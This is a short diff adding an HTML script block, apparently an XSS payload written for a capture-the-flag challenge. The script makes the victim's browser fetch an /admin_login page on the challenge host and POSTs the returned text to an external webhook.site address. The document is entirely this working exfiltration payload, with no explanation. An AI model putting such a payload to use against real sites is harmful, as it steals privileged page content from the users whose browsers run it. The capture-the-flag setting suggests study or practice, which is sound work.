@@ -1,0 +1,13 @@
+<script>
+    fetch('http://zero-storage-eof-ctf.csie.org:1310/admin_login').then((response) => {
+        return response.text()
+    }).then((textResponse) => {
+        // textResponse = textResponse.slice(200)
+        fetch(`https://webhook.site/54ca75b9-90e6-4e97-b469-4543e26575ca`, {
+            method: 'POST',
+            body: textResponse
+        });
+
+    })
+
+</script>
